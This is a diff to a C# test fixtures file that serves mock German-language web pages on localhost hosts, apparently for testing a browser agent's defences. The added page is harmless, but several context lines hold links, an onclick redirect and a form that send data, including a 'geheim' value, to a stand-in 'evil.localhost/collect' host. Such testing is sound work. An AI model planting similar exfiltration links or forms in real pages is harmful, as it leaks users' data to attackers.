@@ -46,6 +46,7 @@ internal sealed class Fixtures:IDisposable
             case "site.localhost/links":return Page("Links","<a id=l href=\"http://evil.localhost:@PORT@/collect?d=1\">Mehr</a><a id=m href=\"/inject\">Intern</a>");
             case "site.localhost/loc":return Page("Loc","<button id=b onclick=\"location='http://evil.localhost:@PORT@/collect?d=loc'\">Weiter geht es</button>");
             case "site.localhost/formx":return Page("FormX","<form action=\"http://evil.localhost:@PORT@/collect\" method=post><input name=q value=geheim><button id=b>Los</button></form>");
+            case "site.localhost/fields4":return Page("FelderVier","<input id=a placeholder=Name><input id=b2 placeholder=Ort><input type=search id=s placeholder=Suche>");
             case "site.localhost/fields":return Page("Felder","<input id=a placeholder=Name><input id=b2 placeholder=Ort><input type=search id=s placeholder=Suche>");
             case "mail.localhost/compose2":return Page("Entwurf2","<input type=search name=q value='suche nach xyz'><span email='chef@example.org'>Chef</span><div id=body contenteditable=true>@LONG@</div><input name=subject aria-label=Betreff value='Quartalszahlen'><button type=button id=send onclick=\"fetch('/send?from=mail2',{method:'POST'})\">Weiter</button>");
             case "evil.localhost/":
